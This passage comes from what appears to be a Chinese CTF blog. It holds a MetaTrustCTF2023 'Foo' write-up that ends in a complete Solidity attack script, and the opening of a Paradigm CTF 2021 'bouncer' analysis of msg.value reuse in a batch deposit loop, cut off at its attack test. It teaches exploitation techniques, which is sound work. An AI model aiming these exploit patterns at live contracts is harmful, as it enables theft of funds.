class="line"></span><br><span class="line">    (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature(&quot;check()&quot;));</span><br><span class="line">    require(abi.decode(data, (bytes32)) == keccak256(abi.encodePacked(&quot;1337&quot;)), &quot;stage1: !check&quot;);</span><br><span class="line"></span><br><span class="line">    (, data) = msg.sender.staticcall(abi.encodeWithSignature(&quot;check()&quot;));</span><br><span class="line">    require(abi.decode(data, (bytes32)) == keccak256(abi.encodePacked(&quot;13337&quot;)), &quot;stage1: !check2&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题方案：由于staticcall不能修改状态，因此我们选择用gas剩余量来判断两次调用。如果让两次调用之间存在差别呢？我们的选择是通过staticcall计算gas的特点：冷地址消耗100gas，热地址消耗2600gas。第一次访问address(0x100)是热地址，返回”1337”，第二次访问address(0x100)是冷地址，消耗100gas，返回“13337”，这是关于<a href="https://www.evm.codes/?fork=shanghai">staticcall操作码</a>的特点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function check() public view returns (bytes32) &#123;</span><br><span class="line">    uint startGas = gasleft();</span><br><span class="line">    uint bal = address(0x100).balance;</span><br><span class="line">    uint usedGas = startGas - gasleft();</span><br><span class="line">    if (usedGas &lt; 1000) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;13337&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    return keccak256(abi.encodePacked(&quot;1337&quot;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h4><p>stage调用会不断地递归下去，直到gas消耗完，要么成功，要么revert(极大概率)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function stage2() external &#123;</span><br><span class="line">    require(stats[1][msg.sender], &quot;goto stage1&quot;);</span><br><span class="line">    stats[2][msg.sender] = true;</span><br><span class="line">    require(this._stage2() == 7, &quot;!stage2&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _stage2() external payable returns (uint x) &#123;</span><br><span class="line">    unchecked &#123;</span><br><span class="line">        x = 1;</span><br><span class="line">        try this._stage2() returns (uint x_) &#123;</span><br><span class="line">            x += x_;</span><br><span class="line">        &#125; catch &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们无法知道程序会在什么时候停下来使得返回值为7，遇到这个情况，最好的方式就是爆破：我在foundry本地测试过了，大概会在40000~41000之间程序会成功，实际攻击题目的时候，不要从i=1开始遍历，因为gas会超过上限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function brure_force_stage2() public &#123;</span><br><span class="line">    for (uint i = 40200; i &lt; 40399; i++) &#123;</span><br><span class="line">        (bool success, ) = address(chall).call&#123;gas: i&#125;(</span><br><span class="line">            abi.encodeWithSignature(&quot;stage2()&quot;)</span><br><span class="line">        );</span><br><span class="line">        if (success) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h4><p>代码量很多，但是其实最简单，这个就是猜测数值，伪随机数，我们在同一笔交易中用相同的方式获取答案。另外需要注意的是，由于回调的时候有<code>&#123;gas: 3_888&#125;</code>限制，因此我们的回调函数要尽可能的小，否则会因为gas不足而revert</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">function stage3() external &#123;</span><br><span class="line">    require(stats[2][msg.sender], &quot;goto stage2&quot;);</span><br><span class="line">    stats[3][msg.sender] = true;</span><br><span class="line">    uint[] memory challenge = new uint[](8);</span><br><span class="line">    // 这里的challenge是根据时间戳来确定的，而时间戳可以在同一笔交易中得知</span><br><span class="line">    challenge[0] = (block.timestamp &amp; 0xf0000000) &gt;&gt; 28;</span><br><span class="line">    challenge[1] = (block.timestamp &amp; 0xf000000) &gt;&gt; 24;</span><br><span class="line">    challenge[2] = (block.timestamp &amp; 0xf00000) &gt;&gt; 20;</span><br><span class="line">    challenge[3] = (block.timestamp &amp; 0xf0000) &gt;&gt; 16;</span><br><span class="line">    challenge[4] = (block.timestamp &amp; 0xf000) &gt;&gt; 12;</span><br><span class="line">    challenge[5] = (block.timestamp &amp; 0xf00) &gt;&gt; 8;</span><br><span class="line">    challenge[6] = (block.timestamp &amp; 0xf0) &gt;&gt; 4;</span><br><span class="line">    challenge[7] = (block.timestamp &amp; 0xf) &gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">    (, bytes memory data) = msg.sender.staticcall&#123;gas: 3_888&#125;(abi.encodeWithSignature(&quot;sort(uint256[])&quot;, challenge));</span><br><span class="line">    uint[] memory answer = abi.decode(data, (uint[]));</span><br><span class="line"></span><br><span class="line">     // 冒泡排序，从小到大</span><br><span class="line">    for(uint i=0 ; i&lt;8 ; i++) &#123;</span><br><span class="line">        for(uint j=i+1 ; j&lt;8 ; j++) &#123;</span><br><span class="line">            if (challenge[i] &gt; challenge[j]) &#123;</span><br><span class="line">                uint tmp = challenge[i];</span><br><span class="line">                challenge[i] = challenge[j];</span><br><span class="line">                challenge[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 从上面分析可以知道，我们的data decode出来之后，数据变化要和时间戳一样，而时间戳在一笔交易得知的</span><br><span class="line">    for(uint i=0 ; i&lt;8 ; i++) &#123;</span><br><span class="line">        require(challenge[i] == answer[i], &quot;stage3: !sort&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：我选择在一笔交易中，构造器中初始化随机数，不在方法中计算随机数否则gas是不够的，然后进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function sort(uint256[] memory) public returns (uint[] memory) &#123;return challenge;&#125;</span><br><span class="line">constructor() &#123;</span><br><span class="line">    // 这里的challenge是根据时间戳来确定的，而时间戳可以在同一笔交易中得知</span><br><span class="line">    challenge[0] = (block.timestamp &amp; 0xf0000000) &gt;&gt; 28;</span><br><span class="line">    challenge[1] = (block.timestamp &amp; 0xf000000) &gt;&gt; 24;</span><br><span class="line">    challenge[2] = (block.timestamp &amp; 0xf00000) &gt;&gt; 20;</span><br><span class="line">    challenge[3] = (block.timestamp &amp; 0xf0000) &gt;&gt; 16;</span><br><span class="line">    challenge[4] = (block.timestamp &amp; 0xf000) &gt;&gt; 12;</span><br><span class="line">    challenge[5] = (block.timestamp &amp; 0xf00) &gt;&gt; 8;</span><br><span class="line">    challenge[6] = (block.timestamp &amp; 0xf0) &gt;&gt; 4;</span><br><span class="line">    challenge[7] = (block.timestamp &amp; 0xf) &gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">    // 冒泡排序，从小到大</span><br><span class="line">    for(uint i=0 ; i&lt;8 ; i++) &#123;</span><br><span class="line">        for(uint j=i+1 ; j&lt;8 ; j++) &#123;</span><br><span class="line">            if (challenge[i] &gt; challenge[j]) &#123;</span><br><span class="line">                uint tmp = challenge[i];</span><br><span class="line">                challenge[i] = challenge[j];</span><br><span class="line">                challenge[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h4><p>这里明显就是要找到stats[4] [who]在EVM的存储位置：涉及到嵌套mapping，找到stats[4] [who]的位置，然后设置为true即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mapping (uint256 =&gt; mapping (address =&gt; bool)) stats; // slot_1</span><br><span class="line"></span><br><span class="line">function stage4() external &#123;</span><br><span class="line">    require(stats[3][msg.sender], &quot;goto stage3&quot;);</span><br><span class="line">    (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature(&quot;pos()&quot;));</span><br><span class="line">    bytes32 pos = abi.decode(data, (bytes32));</span><br><span class="line">    assembly &#123;</span><br><span class="line">        sstore(pos, 0x1)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isSolved() external view returns (bool) &#123;</span><br><span class="line">    return stats[4][who];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function firstMapping(uint256 _key,uint256 x) public pure returns(bytes32) &#123;</span><br><span class="line">    return keccak256(abi.encode(_key, x));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function secondMapping(address _key,uint256 x) public pure returns(bytes32) &#123;</span><br><span class="line">    return keccak256(abi.encode(_key, x));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function findPosition(address addr) public returns(bytes32)&#123;</span><br><span class="line">    bytes32 a1 = firstMapping(4,1);</span><br><span class="line">    bytes32 a2 = secondMapping(addr,uint256(a1));</span><br><span class="line">    return a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &quot;Foo&quot;;</span><br><span class="line"></span><br><span class="line">contract ContainerDeployScript is Script &#123;</span><br><span class="line">    function run() public &#123;</span><br><span class="line">        uint256 deployerPrivateKey = vm.envUint(&quot;privatekey&quot;);</span><br><span class="line"></span><br><span class="line">        vm.startBroadcast(deployerPrivateKey);</span><br><span class="line"></span><br><span class="line">        Attacker xxx = new Attacker();</span><br><span class="line">        xxx.attack();</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        Foo foo = Foo(address(0x828b9ca82DFcC53743a1f60BeafEd1E200511a62));</span><br><span class="line">        </span><br><span class="line">        Deployer deployer = new Deployer(address(foo));</span><br><span class="line">        FooEXP attacker = FooEXP(deployer.deploy());</span><br><span class="line">        </span><br><span class="line">        attacker.hack_setup(address(foo));</span><br><span class="line">        attacker.hack1();</span><br><span class="line">        attacker.hack2&#123;gas:9000000000000&#125;();</span><br><span class="line">        attacker.hack3();</span><br><span class="line">        </span><br><span class="line">        bytes32 position = calPosition(address(attacker));</span><br><span class="line">        attacker.set_pos(position);</span><br><span class="line">        attacker.hack4();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Mapping_1(uint256 _key,uint256 x) public pure returns(bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encode(_key, x));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Mapping_2(address _key,uint256 x) public pure returns(bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encode(_key, x));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calPosition(address addr) public returns(bytes32)&#123;</span><br><span class="line">        bytes32 a1 = Mapping_1(4,1);</span><br><span class="line">        bytes32 a2 = Mapping_2(addr,uint256(a1));</span><br><span class="line">        return a2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FooEXP &#123;</span><br><span class="line">    Foo public chall;</span><br><span class="line">    bytes32 _pos;</span><br><span class="line">    uint[] public challenge = new uint[](8);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        // 这里的challenge是根据时间戳来确定的，而时间戳可以在同一笔交易中得知</span><br><span class="line">        challenge[0] = (block.timestamp &amp; 0xf0000000) &gt;&gt; 28;</span><br><span class="line">        challenge[1] = (block.timestamp &amp; 0xf000000) &gt;&gt; 24;</span><br><span class="line">        challenge[2] = (block.timestamp &amp; 0xf00000) &gt;&gt; 20;</span><br><span class="line">        challenge[3] = (block.timestamp &amp; 0xf0000) &gt;&gt; 16;</span><br><span class="line">        challenge[4] = (block.timestamp &amp; 0xf000) &gt;&gt; 12;</span><br><span class="line">        challenge[5] = (block.timestamp &amp; 0xf00) &gt;&gt; 8;</span><br><span class="line">        challenge[6] = (block.timestamp &amp; 0xf0) &gt;&gt; 4;</span><br><span class="line">        challenge[7] = (block.timestamp &amp; 0xf) &gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">        // 冒泡排序，从小到大</span><br><span class="line">        for(uint i=0 ; i&lt;8 ; i++) &#123;</span><br><span class="line">            for(uint j=i+1 ; j&lt;8 ; j++) &#123;</span><br><span class="line">                if (challenge[i] &gt; challenge[j]) &#123;</span><br><span class="line">                    uint tmp = challenge[i];</span><br><span class="line">                    challenge[i] = challenge[j];</span><br><span class="line">                    challenge[j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function brure_force_stage2() public &#123;</span><br><span class="line">        for (uint i = 40200; i &lt; 40399; i++) &#123;</span><br><span class="line">            (bool success, ) = address(chall).call&#123;gas: i&#125;(</span><br><span class="line">                abi.encodeWithSignature(&quot;stage2()&quot;)</span><br><span class="line">            );</span><br><span class="line">            if (success) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack_setup(address _addr) public &#123;</span><br><span class="line">        chall = Foo(_addr);</span><br><span class="line">        chall.setup();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack1() public &#123;</span><br><span class="line">        chall.stage1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack2() public &#123;</span><br><span class="line">        brure_force_stage2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack3() public &#123;</span><br><span class="line">        chall.stage3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack4() public &#123;</span><br><span class="line">        chall.stage4();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() public view returns (bytes32) &#123;</span><br><span class="line">        uint startGas = gasleft();</span><br><span class="line">        uint bal = address(0x100).balance;</span><br><span class="line">        uint usedGas = startGas - gasleft();</span><br><span class="line">        if (usedGas &lt; 1000) &#123;</span><br><span class="line">            return keccak256(abi.encodePacked(&quot;13337&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;1337&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sort(uint256[] memory) public returns (uint[] memory) &#123;</span><br><span class="line">        return challenge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function set_pos(bytes32 a) public&#123;</span><br><span class="line">        _pos = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pos() public view returns(bytes32)&#123;</span><br><span class="line">        return _pos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Deployer&#123;</span><br><span class="line">    Foo public chall;</span><br><span class="line">    FooEXP public exp;</span><br><span class="line">    uint salt;</span><br><span class="line">    address public deployedAddress;</span><br><span class="line">    </span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        chall = Foo(_addr);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getHash()external view returns(bytes32)&#123;</span><br><span class="line">        bytes memory aaaa = type(FooEXP).creationCode;</span><br><span class="line">        return keccak256(aaaa);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deploy() public returns(address)&#123;</span><br><span class="line">      </span><br><span class="line">        address addr;</span><br><span class="line">        bytes memory bytecode = type(FooEXP).creationCode;</span><br><span class="line">        uint256 salt = bruteForceDeploy();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        deployedAddress = addr;</span><br><span class="line">        </span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAddress(</span><br><span class="line">        bytes memory bytecode,</span><br><span class="line">        uint _salt</span><br><span class="line">    ) public view returns (address) &#123;</span><br><span class="line">        bytes32 hash = keccak256(</span><br><span class="line">            abi.encodePacked(</span><br><span class="line">                bytes1(0xff),</span><br><span class="line">                address(this),</span><br><span class="line">                _salt,</span><br><span class="line">                keccak256(bytecode)</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // NOTE: cast last 20 bytes of hash to address</span><br><span class="line">        return address(uint160(uint(hash)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bruteForceDeploy() public view returns(uint)&#123;</span><br><span class="line">        for (uint i = 1; i &lt; 999999; i++) &#123;</span><br><span class="line">            address addr = getAddress(type(FooEXP).creationCode, i);</span><br><span class="line">            if (uint256(uint160(addr)) % 1000 == 137) &#123;</span><br><span class="line">                return i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 22.MetaTrustCTF2023 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.bouncer</title>
      <link href="/2023/09/26/19.Paradigm%20CTF%202021/06.bouncer/"/>
      <url>/2023/09/26/19.Paradigm%20CTF%202021/06.bouncer/</url>
      
        <content type="html"><![CDATA[<h1 id="bouncer"><a href="#bouncer" class="headerlink" title="bouncer"></a>bouncer</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><ul><li><p>Bounder.sol</p><ul><li>ERC20Like：接口</li><li>Bouncer<ul><li>owner机制，需要验证，无法修改owner</li><li>抄AAVE的存取款机制，存款可以让别人帮，可以批量存款</li><li>owner可以执行任何逻辑：delegatecall</li></ul></li></ul></li><li><p>Setup：初始化题目</p></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将bouncer的ETH余额设置为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">       return address(bouncer).balance == 0;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>根据Setup的初始化情况，我们来看一下资产与状态情况：</p><div class="table-container"><table><thead><tr><th></th><th>ETH</th><th>WETH</th><th>状态</th></tr></thead><tbody><tr><td>Setup</td><td>48</td><td></td><td>注册：10WETH，10ETH</td></tr><tr><td>bouncer</td><td>52</td><td></td><td>owner=Setup</td></tr><tr><td>party</td><td></td><td></td></tr></tbody></table></div><p>我们要将bouncer的52ETH归零，那么就需要让bouncer发钱出来，可能的方法只有：<code>payout()</code>、<code>claimFees()</code>、<code>hatch()</code>：</p><ul><li><p><code>claimFees()</code>：需要owner才做，并且从题目(0.8.0)可以看出，owner无法修改，同时0.8.0也意味着不可能有重入、移除的可能性了。此方法废弃。</p></li><li><p><code>hatch()</code>：需要owner才能操作，但我们不可能是owner，或者是否可能让合约回调自己内？看完题目知道也没有相关的方法。此方法废弃。</p></li><li><p><code>payout()</code></p><ul><li><p>这个是转账的逻辑，那么本题只可能在转账的逻辑等问题上出考点了。</p></li><li><p>要调用<code>payout()</code>只能通过<code>redeem()</code>。虽然<code>redeem()</code>可以随意调用，但是余额不足回revert。因此我们必须先存款。</p></li><li><p>存款方法有两个，一个是普通单个存款<code>convert()</code>，一个是为了省gas的批量存款<code>convertMany()</code>。<code>convert()</code>分析完之后，没啥问题，就是模仿AAVE的机制，再来看一下批量存款<code>convertMany()</code>，额这么少代码，应该没问题，不对，等等！这特么好经典的问题：循环 + 存款逻辑，那么msg.value就可以被复用，一份msg.value存多次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function convertMany(address who, uint256[] memory ids) payable public &#123;</span><br><span class="line">    for (uint256 i = 0; i &lt; ids.length; i++) &#123;</span><br><span class="line">        convert(who, ids[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/06.bouncer/Setup.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    address constant ETH = 